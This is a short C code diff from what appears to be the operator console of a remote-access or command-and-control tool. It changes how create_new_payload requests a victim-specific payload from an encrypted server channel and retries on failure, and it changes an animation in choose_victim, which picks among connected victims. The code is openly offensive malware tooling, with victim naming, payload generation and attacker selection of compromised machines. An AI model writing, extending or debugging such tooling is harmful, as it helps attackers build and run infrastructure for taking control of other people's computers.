@@ -23,6 +23,7 @@ void create_new_payload(){
 	char victim_name[MAX_USER_NAME_LEN];
 	char commend[MAX_USER_NAME_LEN  + 40];
 	char payload_folder_path[15 + MAX_USER_NAME_LEN];
+	bool exit_createto_loop = false;
 	do {
 		print_small_banner();
 		print_rocket_ship_image();
@@ -30,17 +31,24 @@ void create_new_payload(){
 		printf("    Enter vicim name : ");
 		
 		safe_scan(&victim_name, MAX_USER_NAME_LEN);
-		if (valid_victim_name(victim_name))
-			break;
+		if (valid_victim_name(victim_name)){
+			// request the payload from the server
+			A_2_S_encrypted_message_handler(data, GET_VICTIM_PAYLOAD);
+			if (recv_file(victim_name, "payload", "", "payload") == FILE_RECEIVED)
+				exit_createto_loop = true;
+			else{
+				printf("\n[\033[31;1m-\033[0m] \033[31;1mError receiving the payload\033[0m\n");
+				sleep(2);
+			}
+			
+		}
 		else {
 			printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input, victim name may include 'a'-'z', 'A'-'Z', '_' only\033[0m\n");
 			press_enter_to_continue();
 		} 		
-	} while (1);
+	} while (!exit_createto_loop);
 	
-	// request the payload from the server
-	A_2_S_encrypted_message_handler(data, GET_VICTIM_PAYLOAD);
-	recv_file(victim_name, "payload", "", "payload");
+	
 		
 	/*
 	create the config file
@@ -133,7 +141,8 @@ void choose_victim (){
 	}
 	else {
 		#ifdef USER_MESSAGE_PROMPT
-		connecting_load();
+//		connecting_load();
+		moving_airplane();
 		#endif
 		
 		strcpy(data.selected_victim_name, connected_victims[attacker_selection - '0']);
